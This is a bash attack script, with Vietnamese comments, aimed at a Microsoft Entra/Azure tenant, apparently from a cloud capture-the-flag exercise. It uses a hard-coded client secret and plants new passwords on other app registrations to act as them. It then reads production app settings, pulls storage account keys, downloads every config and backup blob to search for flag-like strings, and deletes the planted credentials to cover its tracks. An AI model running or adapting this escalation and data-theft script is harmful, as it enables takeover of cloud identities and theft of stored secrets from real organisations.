#!/usr/bin/env bash
set +e
TEN=3205c325-06a5-4171-9ce8-ffc5e6c2845e
GT=$(curl -s -X POST "https://login.microsoftonline.com/$TEN/oauth2/v2.0/token" \
  --data-urlencode grant_type=client_credentials \
  --data-urlencode client_id=462d1c38-4459-48b8-9333-82e389e59514 \
  --data-urlencode "client_secret=sk18Q~qD22kkHXUCfqXLqdP95DkYJL34eMERlcSj" \
  --data-urlencode scope=https://graph.microsoft.com/.default | jq -r .access_token)
APPS="22a3fb7e-860a-4708-9e50-3d36aa21191c:891fb158-e02c-4428-a885-53b811f369c0:legacy-admin
317eef12-bc80-4c7c-9916-4b2ffcbeb15d:6eb124e3-de61-4fc9-a124-213d98d737f5:reporting-insights
1f07dd31-a868-4c19-9c85-a50b9700f88f:7c2e61eb-f928-45cd-99c9-20da958dd216:directory-sync"
declare -A SEC KID
while IFS=: read oid aid nm; do
  R=$(curl -s -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
    "https://graph.microsoft.com/v1.0/applications/$oid/addPassword" -d '{"passwordCredential":{"displayName":"tmp"}}')
  SEC[$aid]=$(echo "$R"|jq -r .secretText); KID[$aid]=$(echo "$R"|jq -r .keyId)
done <<< "$APPS"
sleep 70
while IFS=: read oid aid nm; do
  echo "######## $nm ########"
  az login --service-principal -u "$aid" -p "${SEC[$aid]}" -t "$TEN" --allow-no-subscriptions >/dev/null 2>&1
  CONN=$(az webapp config appsettings list -g rg-tbl-platform-prod-sea -n app-tbl-storefront-prod \
         --query "[?name=='CONFIG_STORAGE_CONNECTION'].value | [0]" -o tsv 2>/dev/null)
  if [ -n "$CONN" ]; then
    echo ">>> $nm đọc được App Settings. Quét config/backup blob:"
    for sa in sttblappcfgprodx3euoz sttblbackupprodx3euoz; do
      ACCT_CONN="DefaultEndpointsProtocol=https;AccountName=$sa;AccountKey=$(az storage account keys list -n $sa --query '[0].value' -o tsv 2>/dev/null);EndpointSuffix=core.windows.net"
      for c in $(az storage container list --connection-string "$ACCT_CONN" --query "[].name" -o tsv 2>/dev/null); do
        for b in $(az storage blob list --connection-string "$ACCT_CONN" -c "$c" --query "[].name" -o tsv 2>/dev/null); do
          az storage blob download --connection-string "$ACCT_CONN" -c "$c" -n "$b" -f /tmp/b --no-progress -o none 2>/dev/null
          echo "  $sa/$c/$b :: $(grep -aoE '[A-Za-z0-9_]{2,}\{[^}]{3,}\}' /tmp/b | head -1)"
        done
      done
    done
    # cũng thử đọc trực tiếp config storage bằng chính CONFIG_STORAGE_CONNECTION
    for b in $(az storage blob list --connection-string "$CONN" -c config --query "[].name" -o tsv 2>/dev/null); do
      az storage blob download --connection-string "$CONN" -c config -n "$b" -f /tmp/c --no-progress -o none 2>/dev/null
      echo "  config/$b :: $(cat /tmp/c | head -c 300)"
    done
  else
    echo "  $nm: không đọc được app settings"
  fi
  curl -s -X POST -H "Authorization: Bearer $GT" -H "Content-Type: application/json" \
    "https://graph.microsoft.com/v1.0/applications/$oid/removePassword" -d "{\"keyId\":\"${KID[$aid]}\"}" -o /dev/null
done <<< "$APPS"
echo "===== DONE ====="
